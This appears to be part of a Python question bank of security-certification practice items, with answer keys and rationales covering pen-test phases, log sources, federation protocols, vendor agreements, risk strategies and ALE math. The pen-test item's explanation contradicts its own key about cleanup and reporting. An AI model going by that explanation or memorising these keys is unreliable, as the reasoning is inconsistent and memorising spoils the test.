        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Penetration testing phases",
        "stem": (
            "A red team is executing an authorized, scoped external penetration test. Order the concrete events of "
            "the engagement as they occur."
        ),
        "items": [
            {"id": "i1", "text": "Client and tester sign the rules of engagement, defining scope, time window, and permitted techniques"},
            {"id": "i2", "text": "Tester performs passive OSINT and DNS enumeration against the target domain without touching in-scope hosts"},
            {"id": "i3", "text": "Tester runs active vulnerability scans against in-scope external IP ranges to enumerate live services and versions"},
            {"id": "i4", "text": "Tester exploits an unpatched VPN appliance to gain an initial foothold on the internal network"},
            {"id": "i5", "text": "Tester escalates privileges and pivots to a domain controller, capturing proof (not exfiltrating data) per the rules of engagement"},
            {"id": "i6", "text": "Tester removes all implanted tools, reverts configuration changes, and confirms no persistence mechanisms remain"},
            {"id": "i7", "text": "Tester delivers a written report with findings, risk ratings, and remediation recommendations to the client"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6", "i7"],
        "rationales": {
            "i1": "The signed rules of engagement/authorization must exist before any testing activity — performing even passive recon without it would be unauthorized access.",
            "i2": "Passive reconnaissance is the lowest-impact, information-gathering phase and is performed first once authorization is in hand, before any active contact with in-scope systems.",
            "i3": "Active scanning follows passive recon, using gathered information to enumerate live services on in-scope hosts without yet exploiting anything.",
            "i4": "Exploitation follows scanning, using the enumerated vulnerability (the unpatched VPN appliance) to gain the actual foothold.",
            "i5": "Post-exploitation (privilege escalation and pivoting) follows the initial foothold, extending access while staying within the rules of engagement (proof only, no exfiltration).",
            "i6": "Cleanup happens after all testing activity concludes, removing tools and reverting changes so the client's environment isn't left with tester-introduced risk.",
            "i7": "The final deliverable — the written report — is produced last, after all technical activity and cleanup are complete.",
        },
        "explanation": (
            "Engagement order is authorization -> passive recon -> active scanning -> exploitation -> post-exploitation -> cleanup -> "
            "reporting. Skipping the signed rules of engagement (i1) or performing cleanup (i6) before reporting are the two most "
            "common ordering traps, since cleanup must occur before the tester is fully finished, not after the report ships."
        ),
    },
    {
        "id": "npbqa-016",
        "domain": 4,
        "objective": "4.1",
        "type": "pbq_categorize",
        "difficulty": "hard",
        "study_topic": "Log data sources",
        "stem": (
            "A SOC is documenting where different data types come from ahead of a SIEM onboarding project. "
            "Classify each described data feed by its correct log source category."
        ),
        "categories": [
            {"id": "c1", "text": "Network device log (firewall/router/switch)"},
            {"id": "c2", "text": "Endpoint/host log (OS or EDR)"},
            {"id": "c3", "text": "Application log"},
            {"id": "c4", "text": "IDS/IPS alert log"},
            {"id": "c5", "text": "Authentication/directory service log"},
        ],
        "items": [
            {"id": "i1", "text": "Windows Event ID 4625 recording a failed interactive logon on a domain controller"},
            {"id": "i2", "text": "A Snort/Suricata signature match flagged as 'ET TROJAN Possible Cobalt Strike Beacon' with a confidence score"},
            {"id": "i3", "text": "A custom line written by the accounting web app: 'ERROR: invoice #48221 failed validation, user=jsmith'"},
            {"id": "i4", "text": "A Cisco ASA message showing 'Built outbound TCP connection' with source/destination IP and port"},
            {"id": "i5", "text": "Sysmon Event ID 1 showing a process creation event with full command line and hash on an endpoint"},
        ],
        "answer": {"i1": "c5", "i2": "c4", "i3": "c3", "i4": "c1", "i5": "c2"},
        "rationales": {
            "i1": "Event ID 4625 is generated by the directory service (Active Directory/domain controller) authentication subsystem, recording logon failures.",
            "i2": "A signature-based IDS/IPS match with a named detection rule and confidence score is, by definition, an IDS/IPS alert log rather than a raw traffic or endpoint log.",
            "i3": "A custom message written by the application's own code, referencing business logic (invoice validation), is an application log rather than a system-level log.",
            "i4": "The ASA connection-build message is generated by the network firewall device itself, describing traffic it forwarded — a network device log.",
            "i5": "Sysmon runs on the endpoint and records OS-level process creation with command line and hash, making it an endpoint/host log even though it augments EDR-style visibility.",
        },
        "explanation": (
            "Category boundaries hinge on WHERE the log originates and WHAT it describes: directory logs cover identity events, "
            "IDS/IPS logs cover signature/anomaly detections (not raw connections), network device logs describe traffic handled by "
            "the device itself, application logs reflect custom business logic, and endpoint logs describe host-level OS activity."
        ),
    },
    {
        "id": "npbqa-017",
        "domain": 4,
        "objective": "4.4",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Federation & SSO (SAML/OAuth)",
        "stem": (
            "An identity architect is designing federated access between a corporate identity provider (IdP) and "
            "several SaaS applications. Match each requirement to the correct protocol/component."
        ),
        "prompts": [
            {"id": "p1", "text": "A user logs into the corporate portal once and is silently signed into an XML-based SaaS HR application without re-entering credentials"},
            {"id": "p2", "text": "A mobile app needs delegated, scoped access to a user's calendar data hosted by a separate API, without ever seeing the user's password"},
            {"id": "p3", "text": "A third-party analytics service needs to verify a user's identity and retrieve basic profile attributes after OAuth-based delegation completes"},
            {"id": "p4", "text": "The corporate IdP that authenticates users and issues signed assertions to relying-party applications"},
        ],
        "targets": [
            {"id": "t1", "text": "SAML (Security Assertion Markup Language)"},
            {"id": "t2", "text": "OAuth 2.0 authorization framework"},
            {"id": "t3", "text": "OpenID Connect (OIDC) identity layer on top of OAuth 2.0"},
            {"id": "t4", "text": "Identity Provider (IdP)"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4"},
        "rationales": {
            "p1": "Silent SSO into an XML-based enterprise SaaS app using signed assertions is the classic SAML use case, common for browser-based enterprise single sign-on.",
            "p2": "Delegated, scoped access to an API resource (calendar data) without exposing the password is exactly what OAuth 2.0's authorization framework provides via access tokens.",
            "p3": "Verifying identity and retrieving profile attributes on top of an OAuth flow is the job of OpenID Connect, which adds an identity/authentication layer that plain OAuth (authorization only) does not provide.",
            "p4": "The component that authenticates users and issues the assertions/tokens consumed by relying parties is the Identity Provider itself, distinct from the protocols (t1-t3) that carry its output.",
        },
        "explanation": (
            "OAuth authorizes access to resources; it does not itself authenticate a user's identity to a relying party — that is "
            "OIDC's job, layered on top of OAuth. SAML is the older, XML/assertion-based alternative most associated with classic "
            "enterprise browser SSO. The IdP is the actor; SAML/OAuth/OIDC are the protocols it speaks."
        ),
    },

    # ══════════════════════════════════════════════════════════════════
    # DOMAIN 5 (3 questions)
    # ══════════════════════════════════════════════════════════════════
    {
        "id": "npbqa-018",
        "domain": 5,
        "objective": "5.3",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Third-party agreements (SLA/MOU/MSA/BPA)",
        "stem": (
            "Procurement is finalizing paperwork for several vendor relationships. Match each scenario to the "
            "single best-fitting agreement type."
        ),
        "prompts": [
            {"id": "p1", "text": "A managed hosting provider guarantees 99.95% uptime and defines financial penalties/credits if that threshold is missed"},
            {"id": "p2", "text": "Two government agencies with no procurement budget between them document their intent to share threat-intelligence feeds"},
            {"id": "p3", "text": "A master contract with a staffing vendor sets baseline legal, payment, and liability terms that will govern every future work order issued under it"},
            {"id": "p4", "text": "Two companies forming a joint venture on a product define how profits, losses, and responsibilities are divided between the partners"},
        ],
        "targets": [
            {"id": "t1", "text": "Service-level agreement (SLA)"},
            {"id": "t2", "text": "Memorandum of understanding (MOU)"},
            {"id": "t3", "text": "Master service agreement (MSA)"},
            {"id": "t4", "text": "Business partnership agreement (BPA)"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4"},
        "rationales": {
            "p1": "An SLA defines measurable performance commitments (uptime) and the consequences (penalties/credits) for failing to meet them.",
            "p2": "An MOU documents mutual intent and general terms of cooperation between parties without creating a legally binding financial/procurement obligation, fitting the no-budget threat-intel sharing case.",
            "p3": "An MSA establishes the recurring legal and commercial framework that governs future individual work orders/statements of work, exactly the 'master contract' role described.",
            "p4": "A business partnership agreement specifically defines how partners split profit, loss, and responsibility in a joint venture, distinct from a vendor service contract.",
        },
        "explanation": (
            "MOU vs. SLA is a frequent trap: an MOU expresses intent/understanding (often non-binding on performance metrics), while "
            "an SLA sets binding, measurable performance targets with penalties. MSA governs the ongoing vendor relationship "
            "framework, while a BPA is specific to how partners share ownership/profit/loss, not a standard vendor deliverable."
        ),
    },
    {
        "id": "npbqa-019",
        "domain": 5,
        "objective": "5.2",
        "type": "pbq_categorize",
        "difficulty": "hard",
        "study_topic": "Risk management strategies",
        "stem": (
            "A risk committee is reviewing responses proposed for several identified risks. Classify each proposed "
            "response by the risk management strategy it represents."
        ),
        "categories": [
            {"id": "c1", "text": "Avoid"},
            {"id": "c2", "text": "Transfer"},
            {"id": "c3", "text": "Mitigate"},
            {"id": "c4", "text": "Accept"},
        ],
        "items": [
            {"id": "i1", "text": "The company cancels a planned product feature that would have required storing unencrypted cardholder data, eliminating the exposure entirely"},
            {"id": "i2", "text": "The company purchases a cyber-liability insurance policy to cover the financial impact of a potential data breach"},
            {"id": "i3", "text": "The company deploys additional endpoint detection sensors and tightens firewall rules to reduce the likelihood of a successful ransomware attack"},
            {"id": "i4", "text": "After a cost-benefit analysis, leadership formally documents and signs off on continuing to run a low-traffic legacy application whose residual risk score is below the organization's defined risk appetite"},
            {"id": "i5", "text": "The company outsources credit-card processing entirely to a PCI-compliant third party rather than handling card data itself"},
        ],
        "answer": {"i1": "c1", "i2": "c2", "i3": "c3", "i4": "c4", "i5": "c2"},
        "rationales": {
            "i1": "Canceling the feature removes the activity that created the risk altogether, which is the definition of avoidance.",
            "i2": "Purchasing insurance shifts the financial consequence of the risk to a third party (the insurer), the definition of risk transfer.",
            "i3": "Adding detection and tightening controls reduces the likelihood/impact of the risk without eliminating the underlying activity, which is mitigation.",
            "i4": "A formal, documented, sign-off decision to continue operating because residual risk is within appetite — with no further control action taken — is acceptance.",
            "i5": "Outsourcing card processing to a third party shifts the associated compliance and breach risk to that party, making this transfer, not avoidance, since the company still indirectly benefits from card payments.",
        },
        "explanation": (
            "i5 is the discriminator: candidates often mislabel outsourcing as avoidance, but the organization still relies on card "
            "payments being processed (the business activity continues) — only the risk of handling the data directly is shifted to "
            "the third party, which is transfer. True avoidance (i1) means the risky activity stops entirely."
        ),
    },
    {
        "id": "npbqa-020",
        "domain": 5,
        "objective": "5.2",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Quantitative risk analysis (SLE/ALE/ARO)",
        "stem": (
            "A risk analyst is walking through the quantitative risk analysis for a single, specific asset (a "
            "$400,000 database server that could be destroyed by a fire, with a 25% exposure factor and a "
            "historical fire frequency of once every 20 years). Order the analytical steps as they must be "
            "performed to reach a final annualized loss figure."
        ),
        "items": [
            {"id": "i1", "text": "Determine the asset value (AV) of the database server: $400,000"},
            {"id": "i2", "text": "Determine the exposure factor (EF): the percentage of asset value expected to be lost in a single fire event, 25%"},
            {"id": "i3", "text": "Calculate the single loss expectancy (SLE) = AV x EF = $100,000"},
            {"id": "i4", "text": "Determine the annualized rate of occurrence (ARO) from historical frequency: 1 event per 20 years = 0.05"},
            {"id": "i5", "text": "Calculate the annualized loss expectancy (ALE) = SLE x ARO = $5,000"},
            {"id": "i6", "text": "Compare the ALE to the annual cost of a proposed fire-suppression control to determine if the control is cost-justified"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6"],
        "rationales": {
            "i1": "Asset value must be established first since it is a direct input into the SLE calculation that follows.",
            "i2": "The exposure factor is the second input needed before SLE can be calculated, quantifying how much of the asset's value a single event would destroy.",
            "i3": "SLE can only be calculated once both AV and EF are known, since SLE is literally their product.",
            "i4": "ARO is determined next, independently of SLE, converting historical frequency into an annualized probability figure needed for the final step.",
            "i5": "ALE requires both SLE and ARO as inputs, so it can only be calculated after both preceding values are known.",
            "i6": "The cost-benefit comparison against a proposed control is the final decision step, which is meaningless until ALE — the baseline annualized risk figure — has been established.",
        },
        "explanation": (
            "The dependency chain is strict: AV and EF feed SLE; SLE and ARO feed ALE; only once ALE exists can it be weighed "
            "against a control's annual cost. Skipping straight to a cost comparison without first deriving ALE (as some "
            "distractor orderings do) leaves the decision without its required quantitative basis."
        ),
    },
]
